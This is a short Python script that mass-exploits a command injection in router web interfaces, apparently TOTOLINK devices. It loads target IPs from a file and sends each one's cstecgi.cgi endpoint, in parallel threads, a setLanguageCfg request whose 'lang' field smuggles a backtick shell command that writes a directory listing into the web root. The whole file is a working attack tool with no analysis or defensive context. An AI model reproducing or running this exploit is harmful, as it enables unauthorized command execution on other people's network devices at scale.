import requests
import threading

with open('ips.txt', 'r') as file:
    ips = file.read().splitlines()

headers_1 = {
    'Content-Length': '69',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'X-Requested-With': 'XMLHttpRequest',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8,zh-CN;q=0.7,zh;q=0.6',
    'Connection': 'close'
}

payload = {
    'lang': 'en`ls>/web/cmdi.txt`',
    'langAutoFlag': '1',
    'topicurl': 'setLanguageCfg'
}

def send_request(ip):
    headers = headers_1.copy()
    headers['Host'] = ip
    headers['Origin'] = f'http://{ip}'
    headers['Referer'] = f'http://{ip}/login.html'

    url = f"http://{ip}/cgi-bin/cstecgi.cgi"
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=10)
        print(f"Payload sent to {url}")
    except requests.RequestException as e:
        print(f"Error sending requests to {url}: {str(e)}")

threads = []
for ip in ips:
    thread = threading.Thread(target=send_request, args=(ip,))
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
